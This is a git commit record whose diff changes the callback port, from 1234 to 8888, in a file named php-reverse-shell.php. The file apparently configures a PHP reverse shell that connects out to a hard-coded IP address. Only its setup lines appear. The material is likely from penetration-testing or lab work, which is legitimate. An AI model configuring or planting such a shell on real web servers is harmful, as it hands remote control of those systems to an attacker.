f3671a915183817c0b25e27a7dd6e249790f00e5
Jagat Singh <126696595+jagat-singh-chaudhary@users.noreply.github.com>
2023-04-04 14:48:17 +0530

    Update php-reverse-shell.php

--- php-reverse-shell.php
+++ php-reverse-shell.php
@@ -47,7 +47,7 @@
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '192.168.213.42';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$port = 8888;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
